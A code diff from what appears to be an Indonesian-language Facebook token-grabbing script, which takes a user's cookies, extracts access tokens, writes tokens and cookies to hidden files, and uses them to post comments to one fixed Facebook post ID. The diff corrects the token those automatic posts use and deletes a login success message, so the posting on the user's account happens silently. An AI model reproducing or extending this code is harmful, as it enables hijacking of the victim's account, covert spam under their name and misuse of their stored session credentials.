@@ -461,10 +461,9 @@ def login_lagi334():
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN [bold green]<"))
+							Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAT [bold green]<"))
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
 							try:
 								cookie = {'cookie':your_cookies}
 								with requests.Session() as xyz:
@@ -476,9 +475,9 @@ def login_lagi334():
 									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok1)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok}", headers = {"cookie":your_cookies})
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok}", headers = {"cookie":your_cookies})
-									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok}", headers = {"cookie":your_cookies})
+									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
+									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
+									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
 							except Exception as e:
 								print(e)
 							try:
